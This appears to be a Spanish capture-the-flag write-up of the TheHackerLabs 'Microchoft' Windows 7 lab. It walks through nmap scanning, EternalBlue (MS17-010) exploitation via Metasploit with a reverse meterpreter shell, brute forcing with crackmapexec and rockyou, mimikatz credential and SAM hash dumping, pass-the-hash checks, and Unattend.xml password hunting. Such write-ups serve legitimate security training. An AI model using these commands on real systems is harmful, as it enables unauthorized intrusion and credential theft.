---
title: "Microchoft - TheHackerLabs"
date: 2024-11-20
draft: false
slug: "THL-writeup-microchoft"
excerpt: "Esta fue una máquina bastante sencilla. Después de aplicar un descubrimiento de hosts, identificamos nuestro objetivo y comenzamos las pruebas de penetración. Se identifica que el servicio SMB es vulnerable al ataque Eternal Blue, por lo que se hacen distintas pruebas para aplicar este ataque, siendo que únicamente se pudo aplicar con la herramienta Metasploit Framework. Además, se hace un ataque de fuerza bruta con crackmapexec para obtener las contraseñas de los usuarios registrados, pero no fue exitoso. Una vez que obtenemos la sesión de meterpreter, podemos cargar el módulo Kiwi que nos permite usar mimikatz para obtener las contraseñas y hashes NTLM de los usuarios. Por último, buscamos y leemos el archivo Unattend.xml en busca de la contraseña del usuario Administrador, pero no estaba en el archivo, por lo que damos por concluida la máquina."
categories: ["TheHackerLabs", "Easy Machine"]
tags: ["Windows", "SMB", "Remote Code Execution (RCE)", "Eternal Blue MS17-010 (RCE)", "Privesc - Eternal Blue MS17-010 (RCE)", "Metasploit Framework"]
tools:
  - "ping"
  - "nmap"
  - "crackmapexec"
  - "python"
  - "metasploit framework (msfconsole)"
  - "meterpreter"
  - "Módulo: exploit/windows/smb/ms17_010_eternalblue"
  - "Módulo: Kiwi (Mimikatz)"
links:
  - "https://github.com/worawit/MS17-010"
  - "https://github.com/3ndG4me/AutoBlue-MS17-010"
  - "https://github.com/totekuh/eternalblue"
  - "https://github.com/AnikateSawhney/Pwning_Blue_From_HTB_Without_Metasploit"
  - "https://abhishekgk.medium.com/solution-impacket-error-ms17-010-a7787ebacf84"
  - "https://github.com/palantir/python-language-server/issues/370"
  - "https://stackoverflow.com/questions/40368431/unable-to-install-pyopenssl-python27"
  - "https://github.com/fortra/impacket/releases"
showtoc: true
header:
  teaser: "/assets/images/THL-writeup-microchoft/microchoft.jpg"
---

## Recopilación de Información {#Recopilacion}

### Descubrimiento de Hosts {#Hosts}

Hagamos un descubrimiento de hosts para encontrar a nuestro objetivo:
```bash
nmap -sn 192.168.1.0/24
Nmap scan report for 192.168.1.10
Host is up (0.00045s latency).
MAC Address: 03:00:01:1G:22:09 (Oracle VirtualBox virtual NIC)
```
Lo encontramos con la siguiente IP: `192.168.1.10`.

### Traza ICMP {#Ping}

Vamos a realizar un ping para saber si la máquina está activa y en base al TTL veremos que SO opera en la máquina.
```bash
ping -c 4 192.168.1.10
PING 192.168.1.10 (192.168.1.10) 56(84) bytes of data.
64 bytes from 192.168.1.10: icmp_seq=1 ttl=128 time=1.46 ms
64 bytes from 192.168.1.10: icmp_seq=2 ttl=128 time=0.709 ms
64 bytes from 192.168.1.10: icmp_seq=3 ttl=128 time=0.649 ms
64 bytes from 192.168.1.10: icmp_seq=4 ttl=128 time=0.684 ms

--- 192.168.1.10 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3073ms
rtt min/avg/max/mdev = 0.649/0.874/1.457/0.336 ms
```
Por el TTL sabemos que la máquina usa **Windows**, hagamos los escaneos de puertos y servicios.

### Escaneo de Puertos {#Puertos}

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 192.168.1.10 -oG allPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-20 14:04 CST
Initiating ARP Ping Scan at 14:04
Scanning 192.168.1.10 [1 port]
Completed ARP Ping Scan at 14:04, 0.05s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 14:04
Scanning 192.168.1.10 [65535 ports]
Discovered open port 135/tcp on 192.168.1.10
Discovered open port 139/tcp on 192.168.1.10
Discovered open port 445/tcp on 192.168.1.10
Discovered open port 49155/tcp on 192.168.1.10
Discovered open port 49154/tcp on 192.168.1.10
Discovered open port 49152/tcp on 192.168.1.10
Discovered open port 49153/tcp on 192.168.1.10
Discovered open port 49157/tcp on 192.168.1.10
Completed SYN Stealth Scan at 14:05, 37.54s elapsed (65535 total ports)
Nmap scan report for 192.168.1.10
Host is up, received arp-response (0.00063s latency).
Scanned at 2024-11-20 14:04:27 CST for 38s
Not shown: 52142 closed tcp ports (reset), 13385 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE      REASON
135/tcp   open  msrpc        syn-ack ttl 128
139/tcp   open  netbios-ssn  syn-ack ttl 128
445/tcp   open  microsoft-ds syn-ack ttl 128
49152/tcp open  unknown      syn-ack ttl 128
49153/tcp open  unknown      syn-ack ttl 128
49154/tcp open  unknown      syn-ack ttl 128
49155/tcp open  unknown      syn-ack ttl 128
49157/tcp open  unknown      syn-ack ttl 128
MAC Address: 03:00:01:1G:22:09 (Oracle VirtualBox virtual NIC)

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 37.75 seconds
           Raw packets sent: 136591 (6.010MB) | Rcvd: 52156 (2.086MB)
```

| Parámetros | Descripción |
|---|---|
| *-p-*      | Para indicarle un escaneo en ciertos puertos. |
| *--open*   | Para indicar que aplique el escaneo en los puertos abiertos. |
| *-sS*      | Para indicar un TCP Syn Port Scan para que nos agilice el escaneo. |
| *--min-rate* | Para indicar una cantidad de envió de paquetes de datos no menor a la que indiquemos (en nuestro caso pedimos 5000). |
| *-vvv*     | Para indicar un triple verbose, un verbose nos muestra lo que vaya obteniendo el escaneo. |
| *-n*       | Para indicar que no se aplique resolución dns para agilizar el escaneo. |
| *-Pn*      | Para indicar que se omita el descubrimiento de hosts. |
| *-oG*      | Para indicar que el output se guarde en un fichero grepeable. Lo nombre allPorts. |

Veo que solamente hay 3 puertos abiertos. Me parece que la intrusión será por el **servicio SMB**.

### Escaneo de Servicios {#Servicios}

```bash
nmap -sCV -p 135,139,445,49152,49153,49154,49155,49157 192.168.1.10 -oN targeted
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-20 14:07 CST
Nmap scan report for 192.168.1.10
Host is up (0.0058s latency).

PORT      STATE SERVICE      VERSION
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Windows 7 Home Basic 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
49155/tcp open  msrpc        Microsoft Windows RPC
49157/tcp open  msrpc        Microsoft Windows RPC
MAC Address: 03:00:01:1G:22:09 (Oracle VirtualBox virtual NIC)
Service Info: Host: MICROCHOFT; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:

| smb2-time: 
|   date: 2024-11-20T20:08:56
|_  start_date: 2024-11-20T12:47:36
| smb2-security-mode: 
|   2:1:0: 
|_    Message signing enabled but not required
|_clock-skew: mean: -19m58s, deviation: 34m38s, median: 1s
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_nbstat: NetBIOS name: MICROCHOFT, NetBIOS user: <unknown>, NetBIOS MAC: 03:00:01:1G:22:09 (Oracle VirtualBox virtual NIC)
| smb-os-discovery: 
|   OS: Windows 7 Home Basic 7601 Service Pack 1 (Windows 7 Home Basic 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1
|   Computer name: Microchoft
|   NetBIOS computer name: MICROCHOFT\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2024-11-20T21:08:56+01:00

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 65.70 seconds
```

| Parámetros | Descripción |
|---|---|
| *-sC*      | Para indicar un lanzamiento de scripts básicos de reconocimiento. |
| *-sV*      | Para identificar los servicios/versión que están activos en los puertos que se analicen. |
| *-p*       | Para indicar puertos específicos. |
| *-oN*      | Para indicar que el output se guarde en un fichero. Lo llame targeted. |

Parece que el escaneo nos mostró el SO de la máquina e información del **servicio SMB**. Parece que sí es la única vía para atacar la máquina.

## Análisis de Vulnerabilidades {#Analisis}

### Analizando Servicio SMB {#SMB}

Podríamos probar a tratar de enumerar el **servicio SMB**, pero el escaneo nos mostró que es necesario contar con credenciales válidas.

Aun así, podemos obtener algo de información con scripts de **nmap** y con **crackmapexec**.

Usemos primero **crackmapexec**:
```bash
crackmapexec smb 192.168.1.10
SMB         192.168.1.10 445  MICROCHOFT  [*] Windows 7 Home Basic 7601 Service Pack 1 x64 (name:MICROCHOFT) (domain:Microchoft) (signing:False) (SMBv1:True)
```
Confirmamos el SO que usa la máquina y obtenemos el nombre del host.

Ahora con **nmap**, vamos a aplicar scripts que sean seguros y muestren vulnerabilidades para el **servicio SMB**:
```bash
nmap --script "vuln and safe" -p 445 192.168.1.10
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-20 14:12 CST
Nmap scan report for 192.168.1.10
Host is up (0.00065s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds
MAC Address: 03:00:01:1G:22:09 (Oracle VirtualBox virtual NIC)

Host script results:

| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|           
|     Disclosure date: 2017-03-14
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
|_      https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/

Nmap done: 1 IP address (1 host up) scanned in 0.40 seconds
```
Excelente, parece que es vulnerable al **ataque Eternal Blue**, que ya hemos explotado en la **máquina Blue** de **HTB**.

Igual podemos usar el script específico que identifica si un **servicio SMB** es vulnerable al **Eternal Blue**:
```bash
nmap -p 445 --script smb-vuln-ms17-010 192.168.1.10
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-20 21:32 CST
Nmap scan report for 192.168.1.10
Host is up (0.00081s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds
MAC Address: 03:00:01:1G:22:09 (Oracle VirtualBox virtual NIC)

Host script results:

| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|           
|     Disclosure date: 2017-03-14
|     References:
|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143

Nmap done: 1 IP address (1 host up) scanned in 0.33 seconds
```
Con esto es suficiente para saber que Exploit debemos usar.

## Explotación de Vulnerabilidades {#Explotacion}

### Aplicando Ataque Eternal Blue (MS17-010) con Metasploit Framework {#eternalBlue}

Existen muchas opciones que podemos usar para aplicar este ataque, pero en mi caso, ninguno de los siguientes funcionó:
* <a href="https://github.com/worawit/MS17-010" target="_blank">Repositorio de worawit: MS17-010</a>
* <a href="https://github.com/3ndG4me/AutoBlue-MS17-010" target="_blank">Repositorio de 3ndG4me: AutoBlue-MS17-010</a>
* <a href="https://github.com/totekuh/eternalblue" target="_blank">Repositorio de totekuh: eternalblue</a>

Y tampoco funcionó la versión que tiene Kali en su BD: **Microsoft Windows 7/8.1/2008 R2/2012 R2/2016 R2 - 'EternalBlue' SMB Remote Code Execution (MS17-010)**.

Que, de igual forma, aquí hay un blog que explica cómo usarlo:
* <a href="https://github.com/AnikateSawhney/Pwning_Blue_From_HTB_Without_Metasploit" target="_blank">Repositorio de AnikateSawhney: Pwning_Blue_From_HTB_Without_Metasploit</a>

Parece que el error común, es que no puede utilizar ninguna de las **named pipes** para aplicar el Exploit:
```bash
python eternalBlue.py 192.168.1.10
Target OS: Windows 7 Home Basic 7601 Service Pack 1
Not found accessible named pipe
Done
```
O también puede indicar que no se pudo obtener acceso o en el peor caso, crashea la máquina víctima, haciendo que se reinicie.

Caso contrario con la versión de **Metasploit Framework**, que vamos a usar a continuación.

Sigue los pasos:
* Inicia **metasploit**:
```bash
msfconsole -q
[*] Starting persistent handler(s)...
msf6 >
```

* Busca el Exploit de **Eternal Blue**:

```bash
msf6 > search eternalblue

Matching Modules
================
   #   Name                                           Disclosure Date  Rank     Check  Description
   -   ----                                           ---------------  ----     -----  -----------
   0   exploit/windows/smb/ms17_010_eternalblue       2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
...
...
...
```

* Usa el siguiente módulo `exploit/windows/smb/ms17_010_eternalblue` y ve las opciones que necesita el Exploit:

```bash
msf6 > use 0
[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp
msf6 exploit(windows/smb/ms17_010_eternalblue) > show options

Module options (exploit/windows/smb/ms17_010_eternalblue):

   Name           Current Setting  Required  Description
   ----           ---------------  --------  -----------
   RHOSTS                          yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT          445              yes       The target port (TCP)
   SMBDomain                       no        (Optional) The Windows domain to use for authentication. Only affects Windows Server 2008 R2, Windows 7, Windows Embedded Standard 7 target machines.
   SMBPass                         no        (Optional) The password for the specified username
   SMBUser                         no        (Optional) The username to authenticate as
   VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target. Only affects Windows Server 2008 R2, Windows 7, Windows Embedded Standard 7 target machines.
   VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target. Only affects Windows Server 2008 R2, Windows 7, Windows Embedded Standard 7 target machines.

Payload options (windows/x64/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     Tu_IP	      yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port

Exploit target:

   Id  Name
   --  ----
   0   Automatic Target
```

* Únicamente le debemos indicar la IP de la máquina víctima, ya todo lo demás está configurado:
```bash
msf6 exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS 192.168.1.10
RHOSTS => 192.168.1.10
```

* Y lo ejecutamos:

```bash
msf6 exploit(windows/smb/ms17_010_eternalblue) > exploit

[*] Started reverse TCP handler on Tu_IP:4444 
[*] 192.168.1.10:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[+] 192.168.1.10:445 - Host is likely VULNERABLE to MS17-010! - Windows 7 Home Basic 7601 Service Pack 1 x64 (64-bit)
[*] 192.168.1.10:445 - Scanned 1 of 1 hosts (100% complete)
[+] 192.168.1.10:445 - The target is vulnerable.
[*] 192.168.1.10:445 - Connecting to target for exploitation.
[+] 192.168.1.10:445 - Connection established for exploitation.
[+] 192.168.1.10:445 - Target OS selected valid for OS indicated by SMB reply
[*] 192.168.1.10:445 - CORE raw buffer dump (40 bytes)
[*] 192.168.1.10:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 48 6f 6d 65 20 42  Windows 7 Home B
[*] 192.168.1.10:445 - 0x00000010  61 73 69 63 20 37 36 30 31 20 53 65 72 76 69 63  asic 7601 Servic
[*] 192.168.1.10:445 - 0x00000020  65 20 50 61 63 6b 20 31                          e Pack 1        
[+] 192.168.1.10:445 - Target arch selected valid for arch indicated by DCE/RPC reply
[*] 192.168.1.10:445 - Trying exploit with 12 Groom Allocations.
[*] 192.168.1.10:445 - Sending all but last fragment of exploit packet
[*] 192.168.1.10:445 - Starting non-paged pool grooming
[+] 192.168.1.10:445 - Sending SMBv2 buffers
[+] 192.168.1.10:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
[*] 192.168.1.10:445 - Sending final SMBv2 buffers.
[*] 192.168.1.10:445 - Sending last fragment of exploit packet!
[*] 192.168.1.10:445 - Receiving response from exploit packet
[+] 192.168.1.10:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
[*] 192.168.1.10:445 - Sending egg to corrupted connection.
[*] 192.168.1.10:445 - Triggering free of corrupted buffer.
[*] Sending stage (203846 bytes) to 192.168.1.10
[*] Meterpreter session 1 opened (Tu_IP:4444 -> 192.168.1.10:49159) at 2024-11-20 14:51:42 -0600
[+] 192.168.1.10:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 192.168.1.10:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 192.168.1.10:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
```
Muy bien, nos generó una sesión de **meterpreter**.

Con esto hemos comprometido la máquina víctima y somos el **usuario NT Authority**:
```bash
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter > sysinfo
Computer        : MICROCHOFT
OS              : Windows 7 (6.1 Build 7601, Service Pack 1).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 0
Meterpreter     : x64/windows
```
Y ya solo buscamos las flags.

Flag del usuario:
```bash
meterpreter > C:\Users\Lola\Desktop
meterpreter > ls
Listing: C:\Users\Lola\Desktop
==============================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
100666/rw-rw-rw-  282   fil   2024-03-28 10:52:53 -0600  desktop.ini
100666/rw-rw-rw-  32    fil   2024-03-28 10:54:50 -0600  user.txt

meterpreter > cat user.txt
...
```

Flag del administrador:
```bash
meterpreter > C:\Users\Admin\Desktop
meterpreter > ls
Listing: C:\Users\Admin\Desktop
===============================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
100666/rw-rw-rw-  32    fil   2024-03-28 10:51:45 -0600  admin.txt.txt
100666/rw-rw-rw-  282   fil   2024-03-28 10:36:15 -0600  desktop.ini

meterpreter > cat admin.txt.txt
...
```
Pero aún podemos hacer una que otra cosilla.

### Aplicando Fuerza Bruta a Servicio SMB con crackmapexec {#Crackmapexec}

Si bien, pudimos haber usado **hydra** para aplicar fuerza bruta, también podemos hacerlo con **crackmapexec**.

Podemos indicarle a **crackmapexec** que aplique fuerza bruta a un usuario que conozcamos, por ejemplo, al **usuario Admin**:
```bash
crackmapexec smb 192.168.1.10 -u 'Admin' -p /usr/share/wordlists/rockyou.txt
```

Lo malo, es que nos mostrara todos los intentos fallidos, por lo que es bueno usar un filtro con **grep** o con otra herramienta:
```bash
crackmapexec smb 192.168.1.10 -u 'Admin' -p /usr/share/wordlists/rockyou.txt | grep "[+]"
```

Podemos dejarlo un buen rato trabajando, pero no nos va a encontrar ninguna contraseña para ningún usuario.

Nunca está de más probar lo aprendido.

## Post Explotación {#Post}

### Obteniendo Hashes NTLM con Módulo Kiwi de Meterpreter {#Hashes}

Una vez dentro, podemos intentar obtener las credenciales y/o hashes de los usuarios de la máquina.

Esto lo hacemos cargando el **módulo Kiwi** que carga **Mimikatz** a la sesión de **meterpreter**.

**OJO**: para que funcione este módulo, necesitamos ser el **usuario Administrador**.

Usémoslo:
* Carga el **módulo Kiwi**:

```bash
meterpreter > load kiwi
Loading extension kiwi...
  .#####.   mimikatz 2.2.0 20191125 (x64/windows)
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'        Vincent LE TOUX            ( vincent.letoux@gmail.com )
  '#####'         > http://pingcastle.com / http://mysmartlogon.com  ***/

Success.
```

* Veamos si podemos obtener alguna credencial con el comando `creds_all`:

```bash
meterpreter > creds_all
[+] Running as SYSTEM
[*] Retrieving all credentials
wdigest credentials
===================

Username     Domain     Password
--------     ------     --------
(null)       (null)     (null)
MICROCHOFT$  WORKGROUP  (null)

kerberos credentials
====================

Username     Domain     Password
--------     ------     --------
(null)       (null)     (null)
microchoft$  WORKGROUP  (null)
```
No obtuvimos nada.

* Veamos si podemos obtener los **hashes NTLM** con el comando `lsa_dump_sam`:

```bash
meterpreter > lsa_dump_sam
[+] Running as SYSTEM
[*] Dumping SAM
Domain : MICROCHOFT
SysKey : 50eed915eff2e2089c21f2fbdc7a5bb4
Local SID : S-1-5-21-241196597-1966138111-2498293481

SAMKey : 7e4d05b4047b0193db824b57575c8e32

RID  : 000001f4 (500)
User : Administrator
  Hash NTLM: f8d3f...

RID  : 000001f5 (501)
User : Guest

RID  : 000003e8 (1000)
User : Admin
  Hash NTLM: f8d3f...

RID  : 000003e9 (1001)
User : Lola
  Hash NTLM: f8d3f...
```
Me parece extraño que sea el mismo Hash para todos los usuarios.

* Veamos si podemos obtener alguna contraseña en texto claro con el comando `lsa_dump_secrets`:

```bash
meterpreter > lsa_dump_secrets
[+] Running as SYSTEM
[*] Dumping LSA secrets
Domain : MICROCHOFT
SysKey : 50eed...

Local name : MICROCHOFT ( S-1-5-21-.... )
Domain name : WORKGROUP

Policy subsystem is : 1.11
LSA Key(s) : 1, default {c1a9...}
  [00] {c1a9...} b20e29...

Secret  : DefaultPassword

Secret  : DPAPI_SYSTEM
cur/hex : 01 00 00 00 d9 47 4d 75 ...
...
...
...
```

Comprobemos el **Hash NTLM** con los usuarios mostrados con **crackmapexec**, para ver si alguno es válido:
```bash
crackmapexec smb 192.168.1.10 -u 'Administrator' -H 'f8d3f...'
SMB         192.168.1.10 445    MICROCHOFT       [*] Windows 7 Home Basic 7601 Service Pack 1 x64 (name:MICROCHOFT) (domain:Microchoft) (signing:False) (SMBv1:True)
SMB         192.168.1.10 445    MICROCHOFT       [-] Microchoft\Administrator:f8d3f... STATUS_ACCOUNT_DISABLED 
 
crackmapexec smb 192.168.1.10 -u 'Admin' -H 'f8d3f...'
SMB         192.168.1.10 445    MICROCHOFT       [*] Windows 7 Home Basic 7601 Service Pack 1 x64 (name:MICROCHOFT) (domain:Microchoft) (signing:False) (SMBv1:True)
SMB         192.168.1.10 445    MICROCHOFT       [-] Microchoft\Admin:f8d3f... STATUS_PASSWORD_EXPIRED
 
crackmapexec smb 192.168.1.10 -u 'Lola' -H 'f8d3f...'
SMB         192.168.1.10 445    MICROCHOFT       [*] Windows 7 Home Basic 7601 Service Pack 1 x64 (name:MICROCHOFT) (domain:Microchoft) (signing:False) (SMBv1:True)
SMB         192.168.1.10 445    MICROCHOFT       [+] Microchoft\Lola:f8d3f...
```
Parece que solamente funciona con el **usuario Lola**.

Comprobémoslo con **smbmap**:
```bash
smbmap -u 'Lola' -p 'f8d3f...' -H 192.168.1.10
    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)

|---|---|---|---|---|---|---|---|---|
SMBMap - Samba Share Enumerator v1.10.5 | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

[*] Detected 1 hosts serving SMB                                                                                                  
[*] Established 1 SMB connections(s) and 0 authenticated session(s)                                                          
[*] Closed 1 connections
```
No mostró nada, por lo que este hash no sirve para nada.

### Buscando y Leyendo Archivo Unattend.xml {#Unattend}

¿Qué es el archivo **Unattend.xml**?

| **Archivo Unattend.xml** |
|:-----------:|
| *unattend.xml es un archivo de configuración utilizado en sistemas operativos Windows para automatizar el proceso de instalación y configuración de Windows, también conocido como una instalación desatendida. Este archivo es comúnmente empleado en entornos corporativos o en despliegues masivos para estandarizar configuraciones y ahorrar tiempo al eliminar la necesidad de intervención manual durante la instalación.* |

Resulta que en este archivo, es posible que podamos encontrar la contraseña en texto claro o cifrada en **base64** de algún usuario.

Podemos buscar este archivo desde el **meterpreter** con el comando **search**:
```bash
meterpreter > search -f Unattend.xml
Found 1 result...
=================

Path                             Size (bytes)  Modified (UTC)
----                             ------------  --------------
c:\Windows\Panther\unattend.xml  9658          2024-03-28 10:35:48 -0600
```
Obtuvimos la ruta.

Para que puedas leer el archivo, debes abrir una shell:
```batch
meterpreter > shell
.Process 1828 created.
Channel 3 created.
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Users\Admin\Desktop>
C:\Users\Admin\Desktop>cd C:\Windows\Panther\
cd C:\Windows\Panther\
C:\Windows\Panther>type unattend.xml
type unattend.xml
<?xml version='1.0' encoding='utf-8'?>
<unattend xmlns="urn:schemas-microsoft-com:unattend" xmlns:wcm="http://schemas.microsoft.com/WMIConfig/2002/State">

    <settings pass="windowsPE" wasPassProcessed="true">
...
...
...
    <settings pass="oobeSystem" wasPassProcessed="true">
        <component name="Microsoft-Windows-Shell-Setup" processorArchitecture="amd64" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS">
            <AutoLogon>
                <Password>*SENSITIVE*DATA*DELETED*</Password>
                <Enabled>true</Enabled>
                <Username>Admin</Username>
            </AutoLogon>

            <UserAccounts>

                <AdministratorPassword>*SENSITIVE*DATA*DELETED*</AdministratorPassword>

                <LocalAccounts>
                    <LocalAccount wcm:action="add">
                        <Name>Admin</Name>
                        <DisplayName>Admin</DisplayName>
                        <Group>administrators;users</Group>
                        <Password>*SENSITIVE*DATA*DELETED*</Password>
                    </LocalAccount>
                </LocalAccounts>
```
Parece que estaba la contraseña del **usuario Admin**, pero fue eliminada de este archivo.

Sin embargo, es una buena opción que podemos buscar para poder escalar privilegios.
